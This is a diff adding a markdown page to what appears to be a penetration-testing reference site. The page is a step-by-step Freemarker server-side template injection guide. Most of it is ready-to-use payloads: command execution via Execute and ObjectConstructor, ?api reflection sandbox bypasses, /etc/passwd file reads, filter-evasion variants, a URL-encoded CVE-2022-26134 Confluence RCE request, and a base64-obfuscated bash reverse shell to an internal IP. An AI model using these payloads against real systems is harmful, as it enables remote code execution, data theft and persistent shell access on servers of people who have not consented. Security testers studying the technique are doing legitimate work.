@@ -1,0 +1,215 @@
+---
+title: Freemarker (Java - Confluence, Spring)
+description: SSTI exploitation in Freemarker - Execute and ObjectConstructor TemplateModels, ?new() abuse, and CVE-2022-26134 (Confluence) payload form.
+mitre: [T1190, T1059]
+d3fend: [D3-EAL]
+impact: [ServerSideEval, RCE, FileRead]
+cve: [CVE-2022-26134]
+sidebar:
+  order: 5
+  label: Freemarker
+---
+import { Aside } from '@astrojs/starlight/components';
+
+## TL;DR
+
+Freemarker provides "TemplateModels" - Java objects exposed to templates. `freemarker.template.utility.Execute` runs shell commands when instantiated via `?new`. If the application hasn't disabled it (most don't), one payload is enough.
+
+```
+# Confirm Freemarker (not Velocity)
+${7*7}                                                            # → 49
+<#assign x=7>${x}                                                 # → 7 (Freemarker directive)
+
+# RCE - Execute TemplateModel
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
+
+# RCE - ObjectConstructor (older variant)
+<#assign oc="freemarker.template.utility.ObjectConstructor"?new()>
+${oc("java.lang.Runtime").getRuntime().exec("id")}
+```
+
+Success indicator: `uid=` output (or `Process[...]` object representation, depending on how the output is consumed).
+
+## Where this engine lives
+
+- **Atlassian Confluence** - CVE-2022-26134 (OGNL/Freemarker via `?` query parameter). Most operationally-famous Freemarker SSTI.
+- **Spring Framework** - Freemarker is one of Spring's view-resolver options. Sinks in admin panels that template emails or reports.
+- **Apache OFBiz** - uses Freemarker for screens.
+- **Adobe AEM** - partial Freemarker usage in some components.
+- **Custom Java apps** - anything embedding `freemarker.template.Template` for templated output.
+
+## Step 1 - Confirm and orient
+
+```
+${7*7}                          # → 49        confirms template eval
+<#assign x=7>${x}               # → 7         confirms Freemarker directive syntax
+```
+
+If `${7*7}` works but `<#assign>` doesn't, see [Velocity](/codex/web/server-side/ssti/velocity/) - both engines use `${...}` for output but differ on directives.
+
+## Step 2 - Execute via `?new()`
+
+The Freemarker `?new()` built-in instantiates a Java class by name. Several `TemplateModel` classes do useful things on construction:
+
+### `freemarker.template.utility.Execute`
+
+Runs a shell command and returns stdout as a string:
+
+```
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("cat /etc/passwd")}
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("uname -a")}
+```
+
+Inline form (no separate assign):
+
+```
+${"freemarker.template.utility.Execute"?new()("id")}
+```
+
+### `freemarker.template.utility.ObjectConstructor`
+
+More general - instantiates arbitrary classes. Useful when `Execute` is blocked specifically:
+
+```
+<#assign oc="freemarker.template.utility.ObjectConstructor"?new()>
+${oc("java.lang.ProcessBuilder", ["id"]).start().getInputStream()}
+```
+
+`ObjectConstructor` is disabled by default in modern Freemarker but commonly enabled on older deployments.
+
+### `freemarker.template.utility.JythonRuntime` (if Jython is on classpath)
+
+```
+<#assign jr="freemarker.template.utility.JythonRuntime"?new()>
+<@jr>import os; os.system("id")</@jr>
+```
+
+Rare but devastating where it works - most Jython-using apps have far more direct privesc paths.
+
+## Step 3 - `?api` for sandbox bypass (Freemarker 2.3.22+)
+
+Freemarker added `?api` to expose the underlying Java API of any object. This bypasses sandboxes that restrict directive use but allow expressions:
+
+```
+${object?api.getClass().forName("java.lang.Runtime").getMethod("exec",["".getClass()]).invoke(null,"id")}
+```
+
+The exact form depends on what object you have. From a String context:
+
+```
+${"".getClass().forName("java.lang.Runtime").getMethod("exec",["".getClass()]).invoke(null,"id")}
+```
+
+This is the path that worked for CVE-2022-26134 (Confluence) - the OGNL expression evaluated through Freemarker bypassed the sandbox by reaching `Runtime.exec` via reflection.
+
+## Step 4 - Loot before escalating
+
+```
+# Application data model (Freemarker variables in scope)
+${.data_model?keys}                           # lists all top-level variables
+${.data_model}                                # full dump
+
+# Confluence-specific
+${stack.findValue("memberAccess.allowStaticMethodAccess")}
+${parameters}                                 # query parameters as map
+
+# Spring-specific
+${requestScope}
+${sessionScope}
+${applicationScope}
+```
+
+`.data_model?keys` is the fastest way to discover what the application exposes - frequently includes user objects, request data, and configuration.
+
+## Step 5 - File operations
+
+Read files through Freemarker's built-in `file` access if `Execute` is filtered:
+
+```
+<#assign fr="freemarker.template.utility.ObjectConstructor"?new()>
+${fr("java.io.FileInputStream", "/etc/passwd").readAllBytes()?join('')}
+```
+
+Or with `java.nio.file.Files`:
+
+```
+${"".getClass().forName("java.nio.file.Files").getMethod("readString",["".getClass().forName("java.nio.file.Path")]).invoke(null,"".getClass().forName("java.nio.file.Paths").getMethod("get",["".getClass(),"".getClass().getClass()]).invoke(null,"/etc/passwd",[]))}
+```
+
+Awkward but works in deeply-restricted sandboxes.
+
+## Step 6 - Reverse shell
+
+Direct via `Execute` with a shell wrapper:
+
+```
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC4xMC85OTk5IDA+JjE=}|{base64,-d}|{bash,-i}")}
+```
+
+The brace-expansion form sidesteps shell metacharacter filters. Replace the base64 string with `bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1` re-encoded.
+
+For Windows targets:
+
+```
+<#assign ex="freemarker.template.utility.Execute"?new()>
+${ex("powershell -e BASE64_PAYLOAD")}
+```
+
+## CVE-2022-26134 (Confluence) payload form
+
+The Atlassian Confluence pre-auth RCE used Freemarker's `?api` mechanism via an OGNL-injected URL:
+
+```
+/${
+  (#a=@org.apache.commons.io.IOUtils@toString(
+    @java.lang.Runtime@getRuntime().exec("id").getInputStream(),"utf-8"
+  )).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader("X-Cmd-Response",#a))
+}/
+```
+
+URL-encoded form for the wire (drop into any path component of a Confluence URL):
+
+```
+GET /%24%7B(%23a%3D%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec(%22id%22).getInputStream()%2C%22utf-8%22)).(%40com.opensymphony.webwork.ServletActionContext%40getResponse().setHeader(%22X-Cmd-Response%22%2C%23a))%7D/ HTTP/1.1
+```
+
+Output returns in the `X-Cmd-Response` response header. Affected Confluence ≤ 7.18.0 and several earlier branches.
+
+## Filter-aware variants
+
+```
+# Class name in fragments
+<#assign cls="freemarker.template.utility."+"Execute"?new()>${cls("id")}
+
+# Hex-encoded
+<#assign ex="\u0066reemarker.template.utility.Execute"?new()>${ex("id")}
+
+# Via FreeMarker built-ins
+${"freemarker.template.utility.Execute"?eval?new()("id")}
+```
+
+See [filter bypass](/codex/web/server-side/ssti/filter-bypass/) for keyword-stripping bypasses common to all Java templating.
+
+## Detection-only payloads
+
+```
+${7*7}                                       # eval probe
+<#assign x=7>${x}                            # confirms Freemarker (not Velocity)
+${.now}                                      # returns current timestamp
+${.template_name}                            # returns the template's name
+${.locale}                                   # returns server locale
+```
+
+`${.template_name}` is the cleanest "is this Freemarker?" probe - no escalation potential, returns the template path the engine is processing.
+
+## Notes
+
+- **`new_builtin_class_resolver`** is Freemarker's sandbox lever. When set to `TemplateClassResolver.ALLOWS_NOTHING_RESOLVER`, `?new` is completely disabled - payloads fall back to `?api` reflection.
+- **`?api` was added in 2.3.22.** Older deployments (Freemarker 2.3.21 and earlier) lack this escape hatch but also lack the modern sandboxes - they're typically more exploitable through direct `?new`.
+- **Output suppression** - Freemarker errors return `freemarker.template.TemplateException` if `template_exception_handler` is set to `rethrow`. Production deployments usually swallow errors silently; switch probes that don't throw if blind.
+- **JSP integration** - Spring + Freemarker apps sometimes interleave JSP `<%= ... %>` in the same view layer. Reaching Freemarker from a JSP-rendered context requires a different probe form.
+
+<Aside type="caution">
+Freemarker SSTI is the path of choice when attacking Confluence, Spring admin consoles, or any Java enterprise app with templated email/report features. Once `Execute` is reachable, the engagement is effectively over - confirm scope before going past the data-model dump stage.
+</Aside>
